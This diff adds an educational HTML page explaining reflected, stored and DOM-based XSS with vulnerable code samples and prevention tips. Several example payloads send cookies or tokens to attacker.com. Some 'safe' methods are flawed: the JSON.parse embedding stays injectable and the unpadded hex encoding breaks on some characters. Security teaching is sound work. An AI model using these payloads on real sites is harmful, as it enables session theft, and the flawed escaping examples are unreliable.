@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attack Types - Detailed Guide</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        /* Layout System - Consistent with previous pages */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: #333;
+               background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: linear-gradient(to right, #2c3e50, #4a6491);
+            color: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 1.5rem;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+        
+        .logo-img {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+        
+        @media (max-width: 768px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-title {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid;
+            font-size: 1.3rem;
+        }
+        
+        .card-title.reflected { border-bottom-color: #ff6b6b; }
+        .card-title.stored { border-bottom-color: #4ecdc4; }
+        .card-title.dom { border-bottom-color: #45b7d1; }
+        .card-title.context { border-bottom-color: #96ceb4; }
+        .card-title.unsafe { border-bottom-color: #ff9ff3; }
+        
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            border-radius: 5px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .comparison-table th {
+            background: #4a6491;
+            color: white;
+            padding: 1rem;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        .comparison-table td {
+            padding: 1rem;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        .comparison-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .step-list {
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .step-list li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .demo-area {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin: 2rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .form-demo {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 1rem;
+        }
+        
+        .demo-form {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+        }
+        
+        .demo-form h4 {
+            margin-bottom: 1rem;
+            color: #495057;
+        }
+        
+        .type-badge {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .reflected-badge { background: #ff9ff3; color: #2d3436; }
+        .stored-badge { background: #54a0ff; color: white; }
+        .dom-badge { background: #1dd1a1; color: white; }
+        
+        .attack-flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        
+        .flow-step {
+            background: white;
+            padding: 1rem;
+            border-radius: 8px;
+            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 150px;
+            position: relative;
+        }
+        
+        .flow-step:not(:last-child)::after {
+            content: "→";
+            position: absolute;
+            right: -25px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.5rem;
+            color: #6c757d;
+        }
+        
+        @media (max-width: 768px) {
+            .flow-step:not(:last-child)::after {
+                content: "↓";
+                right: 50%;
+                top: auto;
+                bottom: -25px;
+                transform: translateX(50%);
+            }
+            
+            .attack-flow {
+                flex-direction: column;
+            }
+            
+            .flow-step {
+                width: 100%;
+            }
+        }
+        
+        .context-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .context-table th {
+            background: #4a6491;
+            color: white;
+            padding: 1rem;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        .context-table td {
+            padding: 1rem;
+            border-bottom: 1px solid #dee2e6;
+            vertical-align: top;
+        }
+        
+        .context-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .severity-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .severity-high { background: #ff6b6b; }
+        .severity-medium { background: #feca57; }
+        .severity-low { background: #1dd1a1; }
+        
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #dee2e6;
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>           
+            <h1>XSS Attack Types</h1>
+            <p class="subtitle">Understanding Reflected, Stored, and DOM-Based XSS Vulnerabilities</p>
+        </header>
+        
+        <!-- Overview Section -->
+        <div class="card">
+            <h2 class="card-title">XSS Classification Overview</h2>
+            <p>Cross-Site Scripting attacks are categorized based on how the malicious payload is delivered and where it's stored. Understanding these types is crucial for effective defense.</p>
+            
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Persistence</th>
+                        <th>Attack Vector</th>
+                        <th>Detection Difficulty</th>
+                        <th>Impact Scope</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="type-badge reflected-badge">Reflected XSS</span></td>
+                        <td>Non-persistent</td>
+                        <td>URL parameters, form inputs</td>
+                        <td>Easy</td>
+                        <td>Single user per attack</td>
+                    </tr>
+                    <tr>
+                        <td><span class="type-badge stored-badge">Stored XSS</span></td>
+                        <td>Persistent</td>
+                        <td>Databases, file systems</td>
+                        <td>Medium</td>
+                        <td>All affected users</td>
+                    </tr>
+                    <tr>
+                        <td><span class="type-badge dom-badge">DOM-based XSS</span></td>
+                        <td>Non-persistent</td>
+                        <td>Client-side JavaScript</td>
+                        <td>Hard</td>
+                        <td>Single user per attack</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <div class="info">
+                <strong>Note:</strong> All XSS types share the same fundamental vulnerability: improperly handling untrusted data. The difference lies in how the payload reaches the victim.
+            </div>
+        </div>
+        
+        <!-- Reflected XSS Section -->
+        <div class="card">
+            <h2 class="card-title reflected">Reflected XSS</h2>
+            <p><strong>Definition:</strong> The malicious script comes from the current HTTP request and is immediately "reflected" back in the response without being stored on the server.</p>
+            
+            <div class="attack-flow">
+                <div class="flow-step">
+                    <strong>Step 1</strong>
+                    <p>Attacker crafts malicious URL</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 2</strong>
+                    <p>Victim clicks link</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 3</strong>
+                    <p>Server reflects script in response</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 4</strong>
+                    <p>Browser executes script</p>
+                </div>
+            </div>
+            
+            <h4>Vulnerable Code Example:</h4>
+            <div class="code-block">
+// ❌ VULNERABLE - Search feature that echoes user input
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  // Directly outputting user input without sanitization
+  res.send(`&lt;h1&gt;Search results for: ${query}&lt;/h1&gt;`);
+});
+            </div>
+            
+            <h4>Attack Example:</h4>
+            <div class="code-block">
+// Malicious URL crafted by attacker
+https://vulnerable.com/search?q=
+&lt;script&gt;
+  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+&lt;/script&gt;
+
+// Victim receives this email:
+"Check out this cool search: https://vulnerable.com/search?q=..."
+            </div>
+            
+            <h4>Common Locations:</h4>
+            <ul class="step-list">
+                <li>Search functionality</li>
+                <li>Error messages displaying user input</li>
+                <li>Form results pages</li>
+                <li>URL redirects with parameters</li>
+                <li>Contact form confirmation pages</li>
+            </ul>
+            
+            <div class="danger">
+                <strong>⚠️ Social Engineering Aspect:</strong> Reflected XSS requires the victim to click a malicious link. Attackers often use phishing emails, social media posts, or URL shorteners to disguise the attack.
+            </div>
+        </div>
+        
+        <!-- Stored XSS Section -->
+        <div class="card">
+            <h2 class="card-title stored">Stored XSS (Persistent)</h2>
+            <p><strong>Definition:</strong> The malicious script is permanently stored on the target server (database, file system) and served to multiple victims when they view the affected content.</p>
+            
+            <div class="attack-flow">
+                <div class="flow-step">
+                    <strong>Step 1</strong>
+                    <p>Attacker submits malicious content</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 2</strong>
+                    <p>Server stores it permanently</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 3</strong>
+                    <p>Victim views affected page</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 4</strong>
+                    <p>Script executes for all viewers</p>
+                </div>
+            </div>
+            
+            <h4>Vulnerable Code Example:</h4>
+            <div class="code-block">
+// ❌ VULNERABLE - Comment system
+app.post('/comments', (req, res) => {
+  const comment = req.body.comment;
+  // Storing untrusted data without sanitization
+  db.comments.insert(comment);
+  res.redirect('/post');
+});
+
+app.get('/post', (req, res) => {
+  const comments = db.comments.findAll();
+  // Directly inserting stored data into HTML
+  res.send(`
+    &lt;h1&gt;Discussion Post&lt;/h1&gt;
+    &lt;div class="comments"&gt;
+      ${comments.map(c => `&lt;div&gt;${c}&lt;/div&gt;`).join('')}
+    &lt;/div&gt;
+  `);
+});
+            </div>
+            
+            <h4>Attack Payload:</h4>
+            <div class="code-block">
+// Attacker submits this as a "comment":
+Great article! &lt;script&gt;
+  // Steal cookies from anyone viewing this post
+  const img = new Image();
+  img.src = 'https://attacker.com/steal?cookie=' + 
+            encodeURIComponent(document.cookie);
+&lt;/script&gt;
+            </div>
+            
+            <h4>Characteristics:</h4>
+            <ul class="step-list">
+                <li><strong>High Impact:</strong> Affects all users viewing the content</li>
+                <li><strong>Persistent:</strong> Remains until manually removed</li>
+                <li><strong>Difficult to Detect:</strong> May lay dormant for months</li>
+                <li><strong>Worm Potential:</strong> Can self-replicate (MySpace worm)</li>
+            </ul>
+            
+            <div class="warning">
+                <strong>📊 Real-World Impact:</strong> Stored XSS is considered the most dangerous type because a single attack can compromise thousands of users over an extended period.
+            </div>
+        </div>
+        
+        <!-- DOM-based XSS Section -->
+        <div class="card">
+            <h2 class="card-title dom">DOM-based XSS</h2>
+            <p><strong>Definition:</strong> The vulnerability exists entirely in client-side JavaScript that writes user-controlled data to the DOM without proper sanitization.</p>
+            
+            <div class="attack-flow">
+                <div class="flow-step">
+                    <strong>Step 1</strong>
+                    <p>Victim visits malicious URL</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 2</strong>
+                    <p>Client-side JS reads URL parameters</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 3</strong>
+                    <p>JS writes data to DOM unsafely</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 4</strong>
+                    <p>Browser parses and executes script</p>
+                </div>
+            </div>
+            
+            <h4>Vulnerable Client-Side Code:</h4>
+            <div class="code-block">
+// ❌ VULNERABLE - Client-side JavaScript
+function displayWelcome() {
+  // Get 'name' from URL: https://example.com/page?name=value
+  const urlParams = new URLSearchParams(window.location.search);
+  const name = urlParams.get('name');
+  
+  // UNSAFE: Writing URL data directly to innerHTML
+  document.getElementById('welcome-message').innerHTML = 
+    `Welcome, ${name}!`;
+}
+
+// Called on page load
+window.addEventListener('DOMContentLoaded', displayWelcome);
+            </div>
+            
+            <h4>Attack URL:</h4>
+            <div class="code-block">
+// Malicious URL exploiting the vulnerability
+https://example.com/page?name=
+&lt;img src="x" onerror="
+  fetch('https://attacker.com/steal?data=' + 
+        encodeURIComponent(localStorage.getItem('token')))
+"&gt;
+            </div>
+            
+            <h4>Key Characteristics:</h4>
+            <ul class="step-list">
+                <li><strong>Client-Side Only:</strong> Server might not be involved at all</li>
+                <li><strong>Sources:</strong> URL, document.referrer, localStorage, sessionStorage</li>
+                <li><strong>Sinks:</strong> innerHTML, outerHTML, document.write(), eval()</li>
+                <li><strong>Detection Challenge:</strong> Hard to spot in code reviews</li>
+            </ul>
+            
+            <div class="info">
+                <strong>🔍 Detection Tip:</strong> DOM-based XSS doesn't appear in server logs because the attack happens entirely in the browser. Use client-side monitoring tools to detect suspicious DOM manipulations.
+            </div>
+        </div>
+        
+        <!-- XSS Contexts Section -->
+        <div class="demo-area">
+            <h3>🔄 XSS Contexts: How Data Becomes Dangerous</h3>
+            <p>The same untrusted data can be dangerous in different contexts. Proper handling depends on where the data will be used.</p>
+            
+            <table class="context-table">
+                <thead>
+                    <tr>
+                        <th>Context</th>
+                        <th>Example</th>
+                        <th>Dangerous Characters</th>
+                        <th>Proper Escaping</th>
+                        <th>Risk Level</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>HTML Content</strong><br>Between tags</td>
+                        <td><code>&lt;div&gt;${data}&lt;/div&gt;</code></td>
+                        <td><code>&lt; &gt; &amp;</code></td>
+                        <td>HTML Entity Encoding</td>
+                        <td><span class="severity-indicator severity-high"></span> High</td>
+                    </tr>
+                    <tr>
+                        <td><strong>HTML Attributes</strong><br>Inside attribute values</td>
+                        <td><code>&lt;div class="${data}"&gt;</code></td>
+                        <td><code>" ' &amp; &lt; &gt;</code></td>
+                        <td>Attribute Encoding + Quotes</td>
+                        <td><span class="severity-indicator severity-high"></span> High</td>
+                    </tr>
+                    <tr>
+                        <td><strong>JavaScript Context</strong><br>Inside script tags</td>
+                        <td><code>&lt;script&gt;const x = "${data}";&lt;/script&gt;</code></td>
+                        <td><code>" ' \ ; &lt; &gt;</code></td>
+                        <td>JavaScript Encoding</td>
+                        <td><span class="severity-indicator severity-very-high"></span> Very High</td>
+                    </tr>
+                    <tr>
+                        <td><strong>URL Context</strong><br>In href or src attributes</td>
+                        <td><code>&lt;a href="${data}"&gt;</code></td>
+                        <td><code>javascript: data: file:</code></td>
+                        <td>URL Encoding + Whitelisting</td>
+                        <td><span class="severity-indicator severity-medium"></span> Medium</td>
+                    </tr>
+                    <tr>
+                        <td><strong>CSS Context</strong><br>In style attributes or tags</td>
+                        <td><code>color: ${data};</code></td>
+                        <td><code>expression() url() javascript:</code></td>
+                        <td>CSS Encoding</td>
+                        <td><span class="severity-indicator severity-medium"></span> Medium</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <!-- HTML Context Examples -->
+        <div class="card">
+            <h2 class="card-title context">HTML Context Vulnerabilities</h2>
+            
+            <h4>1. HTML Content Context</h4>
+            <div class="code-block">
+// ❌ VULNERABLE - Data between HTML tags
+const username = getUserInput();
+element.innerHTML = `&lt;div&gt;Hello, ${username}!&lt;/div&gt;`;
+
+// Attack payload:
+// &lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
+
+// ✅ SAFE - Proper HTML escaping
+function escapeHtml(unsafe) {
+  return unsafe
+    .replace(/&amp;/g, '&amp;amp;')    // Must be first!
+    .replace(/&lt;/g, '&amp;lt;')
+    .replace(/&gt;/g, '&amp;gt;')
+    .replace(/"/g, '&amp;quot;')
+    .replace(/'/g, '&#039;');
+}
+
+element.innerHTML = `&lt;div&gt;Hello, ${escapeHtml(username)}!&lt;/div&gt;`;
+            </div>
+            
+            <h4>2. HTML Attribute Context</h4>
+            <div class="code-block">
+// ❌ VULNERABLE - Data in attributes
+const userTheme = getUserInput();
+element.innerHTML = `&lt;div class="${userTheme}"&gt;Hello&lt;/div&gt;`;
+
+// Attack payload:
+// dark" onmouseover="fetch('https://attacker.com/steal?c='+document.cookie)
+
+// ✅ SAFE - Attribute encoding with quotes
+function escapeHtmlAttribute(unsafe) {
+  return unsafe
+    .replace(/&amp;/g, '&amp;amp;')
+    .replace(/"/g, '&amp;quot;')
+    .replace(/'/g, '&#039;')
+    .replace(/&lt;/g, '&amp;lt;')
+    .replace(/&gt;/g, '&amp;gt;');
+}
+
+// Always use quotes around attributes!
+element.innerHTML = 
+  `&lt;div class="${escapeHtmlAttribute(userTheme)}"&gt;Hello&lt;/div&gt;`;
+            </div>
+            
+            <div class="warning">
+                <strong>⚠️ Special Attribute Warning:</strong> Attributes like <code>src</code>, <code>href</code>, and event handlers (<code>onclick</code>, <code>onmouseover</code>) require extra caution. Never use untrusted data in <code>javascript:</code> URLs or event handlers.
+            </div>
+        </div>
+        
+        <!-- JavaScript Context Section -->
+        <div class="card">
+            <h2 class="card-title">JavaScript Context Vulnerabilities</h2>
+            
+            <p>Embedding untrusted data in JavaScript code is particularly dangerous because JavaScript has multiple ways to break out of string contexts.</p>
+            
+            <div class="code-block">
+// ❌ VULNERABLE - Data in JavaScript strings
+const userName = getUserInput();
+const script = `
+  &lt;script&gt;
+    const user = "${userName}";
+    showGreeting(user);
+  &lt;/script&gt;
+`;
+
+// Attack payload:
+// "; fetch('https://attacker.com/steal?c='+document.cookie); "
+
+// Resulting dangerous code:
+&lt;script&gt;
+  const user = "";
+  fetch('https://attacker.com/steal?c=' + document.cookie);
+  "";
+  showGreeting(user);
+&lt;/script&gt;
+            </div>
+            
+            <h4>Safe Alternatives:</h4>
+            
+            <div class="code-block">
+// ✅ METHOD 1: Hexadecimal encoding
+function hexEncode(str) {
+  return Array.from(str)
+    .map(c => c.charCodeAt(0).toString(16))
+    .join('');
+}
+
+function hexDecode(hex) {
+  return hex.match(/.{1,2}/g)
+    .map(byte => String.fromCharCode(parseInt(byte, 16)))
+    .join('');
+}
+
+// In HTML/JS:
+const script = `
+  &lt;script&gt;
+    const user = hexDecode("${hexEncode(userName)}");
+    showGreeting(user);
+  &lt;/script&gt;
+`;
+            </div>
+            
+            <div class="code-block">
+// ✅ METHOD 2: Using &lt;template&gt; tags
+const html = `
+  &lt;template id="user-data"&gt;${escapeHtml(userName)}&lt;/template&gt;
+  &lt;script&gt;
+    const user = document.getElementById('user-data').textContent;
+    showGreeting(user);
+  &lt;/script&gt;
+`;
+
+// ✅ METHOD 3: JSON encoding (for complex data)
+const userData = { name: userName };
+const script = `
+  &lt;script&gt;
+    const userData = JSON.parse('${JSON.stringify(userData)}');
+    showGreeting(userData.name);
+  &lt;/script&gt;
+`;
+            </div>
+            
+            <div class="info">
+                <strong>Best Practice:</strong> Avoid embedding untrusted data directly in JavaScript. Instead, use data attributes, fetch data via API, or use template tags.
+            </div>
+        </div>
+        
+        <!-- Never-Safe Contexts -->
+        <div class="card">
+            <h2 class="card-title unsafe">Never-Safe Contexts</h2>
+            
+            <p>Some contexts are inherently unsafe and should <strong>never</strong> include untrusted data:</p>
+            
+            <div class="danger">
+                <strong>❌ NEVER DO THIS:</strong>
+            </div>
+            
+            <div class="code-block">
+// 1. Direct script content
+&lt;script&gt;${userData}&lt;/script&gt;
+
+// 2. HTML comments
+&lt;!-- ${userData} --&gt;
+
+// 3. Tag names
+&lt;${userData} href="/foo"&gt;
+
+// 4. Attribute names
+&lt;div ${userData}="value"&gt;
+
+// 5. CSS in style tags
+&lt;style&gt;${userData}&lt;/style&gt;
+
+// 6. JavaScript URLs
+&lt;a href="javascript:${userData}"&gt;Click&lt;/a&gt;
+
+// 7. Event handlers
+&lt;div onmouseover="${userData}"&gt;
+
+// 8. CSS expressions (old IE)
+&lt;div style="width: expression(${userData})"&gt;
+            </div>
+            
+            <h4>Why These Are Dangerous:</h4>
+            <ul class="step-list">
+                <li><strong>Too Many Escape Vectors:</strong> Multiple ways to break out of context</li>
+                <li><strong>Complex Parsing Rules:</strong> Browser quirks and edge cases</li>
+                <li><strong>Historical Vulnerabilities:</strong> Legacy browser behaviors</li>
+                <li><strong>Encoding Bypasses:</strong> Different encoding layers can be bypassed</li>
+            </ul>
+            
+            <div class="success">
+                <strong>✅ Safe Alternative:</strong> For these contexts, use whitelisting - only allow specific, known-safe values. For example, only allow specific CSS properties, specific HTML tags, or specific event handlers.
+            </div>
+        </div>
+        
+        <!-- Prevention Summary -->
+        <div class="demo-area">
+            <h3>🛡️ Prevention Strategies by XSS Type</h3>
+            
+            <div class="form-demo">
+                <div class="demo-form">
+                    <h4>Reflected XSS Prevention</h4>
+                    <ul class="step-list">
+                        <li>✅ Validate and sanitize all URL parameters</li>
+                        <li>✅ Encode output with context-aware escaping</li>
+                        <li>✅ Implement Content Security Policy (CSP)</li>
+                        <li>✅ Use parameterized templates (React, Vue, etc.)</li>
+                        <li>✅ Educate users about suspicious links</li>
+                    </ul>
+                </div>
+                
+                <div class="demo-form">
+                    <h4>Stored XSS Prevention</h4>
+                    <ul class="step-list">
+                        <li>✅ Sanitize ALL stored data (input validation)</li>
+                        <li>✅ Use prepared statements for databases</li>
+                        <li>✅ Implement output encoding at display time</li>
+                        <li>✅ Regular security audits of stored content</li>
+                        <li>✅ Automated scanning for malicious content</li>
+                    </ul>
+                </div>
+                
+                <div class="demo-form">
+                    <h4>DOM-based XSS Prevention</h4>
+                    <ul class="step-list">
+                        <li>✅ Avoid unsafe DOM sinks (innerHTML, eval())</li>
+                        <li>✅ Use textContent instead of innerHTML</li>
+                        <li>✅ Validate client-side data sources</li>
+                        <li>✅ Use safe DOM manipulation libraries</li>
+                        <li>✅ Implement client-side CSP</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="code-block" style="margin-top: 1rem;">
+// Comprehensive XSS Prevention Function
+function safeOutput(data, context = 'html') {
+  switch(context) {
+    case 'html':
+      return escapeHtml(data);
+    case 'attribute':
+      return escapeHtmlAttribute(data);
+    case 'javascript':
+      return JSON.stringify(data).slice(1, -1);
+    case 'url':
+      return encodeURIComponent(data);
+    case 'css':
+      return escapeCss(data);
+    default:
+      throw new Error(`Unknown context: ${context}`);
+  }
+}
+
+// Usage examples:
+element.innerHTML = `&lt;div class="${safeOutput(userClass, 'attribute')}"&gt;
+                      ${safeOutput(userName, 'html')}
+                    &lt;/div&gt;`;
+            </div>
+        </div>
+        
+              <footer>
+                <!-- Primeira linha: Referência ao curso -->
+                <p style="margin-bottom: 0.5rem;">
+                    <strong>Based on "Introduction to JavaScript Security (LFS184)" by The Linux Foundation</strong>
+                </p>
+                
+                <!-- Segunda linha: Informações de licença e autoria -->
+                <p style="margin-bottom: 1rem; font-size: 0.95rem;">
+                    Security education reference • Created for learning and demonstration purposes • Licensed under 
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank" 
+                    style="color: #4a6491; text-decoration: none; font-weight: 600;">
+                        CC-BY-SA-4.0
+                    </a>
+                </p>
+                
+                <!-- Terceira linha: Informações pessoais -->
+                <div style="display: flex; justify-content: center; align-items: center; gap: 1rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                    <span style="color: #4a6491; font-weight: 600;">© Iure Castro</span>
+                    <span style="color: #666;">•</span>
+                    <span>Personal learning portfolio</span>
+                    <span style="color: #666;">•</span>
+                    <span>All examples for educational use</span>
+                </div>
+                
+                <!-- Quarta linha: Links úteis -->
+                <div style="display: flex; justify-content: center; gap: 1.5rem; margin: 1rem 0; flex-wrap: wrap;">
+                    <a href="https://training.linuxfoundation.org/training/introduction-to-javascript-security-lfs184/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🔗 Original Course
+                    </a>
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        📄 CC-BY-SA-4.0 License
+                    </a>
+                    <a href="certificate.pdf" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🏆 My Certificate
+                    </a>
+                </div>
+        </footer>
+    </div>
+
+    <script>
+        // Helper functions for demonstration
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        function escapeHtmlAttribute(text) {
+            return text
+                .replace(/&/g, '&amp;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
+        }
+        
+        // Educational console message
+        console.log(`
+        XSS Types Guide - Key Takeaways:
+        
+        1. REFLECTED XSS:
+           - Immediate reflection of user input
+           - Requires user interaction (clicking link)
+           - Prevent with output encoding
+        
+        2. STORED XSS:
+           - Persistent storage on server
+           - Affects all users viewing content
+           - Prevent with input sanitization
+        
+        3. DOM-BASED XSS:
+           - Client-side only vulnerability
+           - Sources: URL, localStorage, etc.
+           - Sinks: innerHTML, eval(), etc.
+           - Prevent with safe DOM APIs
+        
+        Always consider CONTEXT when handling untrusted data!
+        `);
+    </script>
+    
+    <!-- Prism.js for syntax highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+</body>
+</html>
